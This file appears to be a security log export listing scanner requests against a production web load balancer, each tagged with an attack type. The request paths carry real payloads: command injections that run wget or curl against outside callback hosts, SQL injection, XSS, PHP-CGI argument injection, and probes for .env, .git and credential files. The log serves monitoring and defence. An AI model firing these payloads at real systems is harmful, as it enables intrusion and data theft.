Stream Name,Client IP,Attack Type,Method,Request Path,Status Code
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/mailit.pl HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/login HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/mt/mt-check.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/login.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/mt/mt-load.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/mailit.pl HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/mt-static/mt-check.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/mt/mt-check.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/mt-static/mt-load.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/mt/mt-load.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/ncbook/book.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/mt-static/mt-check.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/printenv HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/mt-static/mt-load.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/printenv.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/ncbook/book.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/quickstore.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/printenv HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/search HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/printenv.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/search.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/quickstore.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/search/search.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/search HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/status HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/search.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/status.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/search/search.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/test.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/status HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/test.sh HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/status.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/test-cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/upload.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/test.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/test.sh HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/urlcount.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/viewcvs.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/test-cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/wa HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/upload.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/wa.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/urlcount.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/wa.exe HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/viewcvs.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/whois.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/wa HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/wa.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/wa.exe HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/whois.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/phpinfo.php HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,POST,/cgi-bin/logo_extra_upload.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,PUT,/cgi-bin/doPQR8.txt HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,PUT,/cgi-bin/6xyAJz.txt HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/doPQR8.txt HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,DELETE,/cgi-bin/6xyAJz.txt HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Git Exposure,GET,/.git/config HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Directory Listing,GET,/bin/querybuilder.json.;%0aa.css?path=/home&p.hits=full&p.limit=-1 HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Directory Listing,GET,/bin/querybuilder.json.;%0aa.css?path=/etc&p.hits=full&p.limit=-1 HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Directory Listing,GET,/bin/querybuilder.json.css?path=/home&p.hits=full&p.limit=-1 HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Directory Listing,GET,/bin/querybuilder.json.css?path=/etc&p.hits=full&p.limit=-1 HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Config File Access,GET,/config/config.json HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Backup File,GET,/backup.sql HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Backup File,GET,/dump.sql HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/luci HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/mesh.cgi?page=upgrade&key=;%27wget+http://d6kfnv95n4evp8t7j9pgo1e85qnxebx78.oast.site;%27 HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,POST,/cgi-bin/nightled.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/touchlist_sync.cgi?IP=;wget+http://d6kfnv95n4evp8t7j9pgjehpafzgywhwp.oast.site; HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Config File Access,GET,/config.json HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Admin Panel Scan,POST,/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=11.2 HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/printenv.pl HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Environment File,GET,/.env_1 HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Environment File,GET,/.env_sample HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,XSS Attempt,GET,/aa404bb?a</script><script>alert(/XSS/)</script> HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Admin Panel Scan,POST,/wp-admin/admin-ajax.php?action=check_country_selector HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,POST,/cgi-bin/login.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/ALFA_DATA/alfacgiapi/ HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,POST,/ztp/cgi-bin/handler HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/guestimage.html HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,POST,/cgi-bin/login.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/ExportLogs.sh HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,POST,/cgi-bin/xmlstatus.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/common/login/webLogin HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,POST,/vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,POST,/vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,POST,/vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,POST,/network_test.php HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Git Exposure,GET,/.git/config HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/StudioServer/server/wwtest/phpinfo.php HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/server/wwtest/phpinfo.php HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/ExportLogs.sh HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/ExportSettings.sh HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Backup File,GET,/backup.sql HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Backup File,GET,/dump.sql HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,POST,/cgi-bin/rpc HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,POST,/cgi-bin/luci/;stok=/locale?form=country HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,POST,/cgi-bin/luci/;stok=/locale?form=country HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,POST,/cgi-bin/fax_change_faxtrace_settings HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/PPPz.css HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Git Exposure,GET,/Server/.git/config HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Git Exposure,GET,/StudioServer/.git/config HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/EbXm.css HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/ems/cgi-bin/ezrf_upgrade_images.cgi?op_type=deleteprogressfile&progressfile=WNPee%3Bcurl%20d6jcgnuu5rajb3smuiqg8jmfr9katiw7d.oast.site%20%23 HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/luci HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Config File Access,GET,/ws-config.json HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Config File Access,GET,/config.json HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Config File Access,GET,/config/config.json HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Config File Access,GET,/credentials/config.json HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/?phpinfo=-1 HTTP/1.1,200
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Admin Panel Scan,POST,/wp-admin/admin-post.php HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,SQL Injection,GET,/ws/msw/tenant/'%20union%20select%20(select%20ID%20from%20SGMSDB.DOMAINS)%2C%20''%2C%20''%2C%20''%2C%20''%2C%20''%2C%20(select%20MD5(999999999))%2C''%2C%20''%2C%20' HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/config.exp HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Config File Access,GET,/jsconfig.json HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/test/test.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/awstats.pl HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/awstats/awstats.pl HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Git Exposure,GET,/.git/config HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,POST,/cgi-bin/vitogate.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/MANGA/index.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,POST,/cgi-bin/quick/quick.cgi?func=switch_os&todo=uploaf_firmware_image HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,POST,/cgi-bin/quick/5B25WH HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Admin Panel Scan,POST,/partymgr/control/getJSONuiLabel HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Admin Panel Scan,POST,/partymgr/control/getJSONuiLabelArray HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Admin Panel Scan,POST,/partymgr/control/getJSONuiLabel HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Admin Panel Scan,POST,/partymgr/control/getJSONuiLabelArray HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,POST,/cgi-bin/cgi_main.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,POST,/cgi-bin/vitogate.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,POST,/cgi-bin/vitogate.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/upload/web-ftp.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Directory Listing,GET,/model-versions/get-artifact?path=random&name=UadUul&version=2 HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;ifconfig;%27 HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;id;%27 HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&group=%27;id;%27 HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&group=%27;ifconfig;%27 HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/mainfunction.cgi/apmcfgupload?session=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx0.%52$c%52$ccurl${IFS}d6kfnv95n4evp8t7j9pgpugzmjeadpwes.oast.site HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/login?LD_DEBUG=files HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Git Exposure,GET,/.git/config HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/ExportSettings.sh HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/cgibox?.cab HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/cgibox?/nobody HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Git Exposure,GET,/.git/logs/HEAD HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,POST,/cgi-bin/cstecgi.cgi?token HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,POST,/cgi-bin/cstecgi.cgi?token=C6F41C563E86A379 HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Backup File,GET,/backup.sql HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Backup File,GET,/dump.sql HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,"/desktop,/cgi-bin/remote_help-cgi/favicon.ico?type=sshd_tdc HTTP/1.1",404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/MAMP/phpinfo.php HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ= HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/info.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Backup File,GET,/api/webdav/chatgpt-next-web/backup.json?endpoint=https://webdav.yandex.com.d6kfnv95n4evp8t7j9pgyb471mf8mwuf8.oast.site/ HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/printenv.pl HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Admin Panel Scan,POST,/wp-admin/admin-ajax.php HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/php-info.php HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/php_info.php HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/phpinfo.php HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/info.php HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.* HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.* HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/nobody/Machine.cgi?action=get_capability HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Config File Access,GET,/config/database.yml HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Info Disclosure,GET,/vendor/phpfastcache/phpfastcache/docs/examples/phpinfo.php HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/vendor/phpfastcache/phpfastcache/examples/phpinfo.php HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Git Exposure,GET,/.git/config HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,POST,/cgi-bin/skk_get.cgi HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,XSS Attempt,GET,/webapp/?fccc%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,POST,/test.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Backup File,GET,/wp-content/plugins/updraftplus/backup.php HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Info Disclosure,GET,/cgi-bin/sslvpnclient?launchplatform HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,38.225.15.86,Environment File,GET,/.env HTTP/1.1,301
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.65.178,Backup File,GET,/backup.sql HTTP/1.1,404
_httpd_access_log_Uber_Swag_ALB_PROD_Lapine,192.168.32.45,Backup File,GET,/dump.sql HTTP/1.1,404
